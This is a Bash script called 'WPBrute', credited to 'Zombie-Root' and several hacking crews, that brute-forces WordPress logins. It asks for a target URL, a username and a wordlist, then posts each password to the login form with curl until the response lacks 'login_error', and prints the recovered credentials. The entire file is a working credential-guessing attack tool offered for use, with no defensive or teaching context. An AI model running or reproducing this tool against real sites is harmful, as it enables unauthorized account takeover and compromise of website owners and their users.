#!/bin/bash
# WPBrute (Bash)
# By Zombie-Root
#
# Thanks: Ccocot
# Bahari Trouble Maker - IndoXploit - Suram-Crew
# Jloyal - Berdendang C0de

clear;
echo ' __        ______  ____             _         ';
echo ' \ \      / /  _ \| __ ) _ __ _   _| |_ ___   ';
echo '  \ \ /\ / /| |_) |  _ \| "__| | | | __/ _ \  ';
echo '   \ V  V / |  __/| |_) | |  | |_| | ||  __/_ ';
echo '    \_/\_/  |_|   |____/|_|   \__,_|\__\___(_)';
echo '  Wordpress Bruteforce Login Bash Version 1.0 ';
echo -ne '\n';
echo -n "Input URL	: "; read url
echo -n "Username	: "; read username
echo -n "Wordlist	: "; read wlist

echo Total [$(wc -l < $wlist)] Wordlist

i=0
for passw in $(cat $wlist); do
	i=$[i+1]
	brute=$(curl -i -L --data-urlencode  log=$username --data-urlencode pwd=$passw $url)
	if [[ $brute =~ "login_error" ]];
	then
		clear;
		echo ' __        ______  ____             _         ';
		echo ' \ \      / /  _ \| __ ) _ __ _   _| |_ ___   ';
		echo '  \ \ /\ / /| |_) |  _ \| "__| | | | __/ _ \  ';
		echo '   \ V  V / |  __/| |_) | |  | |_| | ||  __/_ ';
		echo '    \_/\_/  |_|   |____/|_|   \__,_|\__\___(_)';
		echo -ne '\n'
		echo '  Trying ['$i'/'$(wc -l < $wlist)']';
		echo -ne '\n\n'

	else
		clear;
		echo '  _____                     _ _ '
		echo ' |  ___|__  _   _ _ __   __| | |'
		echo ' | |_ / _ \| | | | "_ \ / _` | |'
		echo ' |  _| (_) | |_| | | | | (_| |_|'
		echo ' |_|  \___/ \__,_|_| |_|\__,_(_)'
		echo -ne '\n'
		echo $url;
		echo 'Username : '$username;
		echo 'Password : '$passw;
		echo -ne '\n'
		break;
	fi
done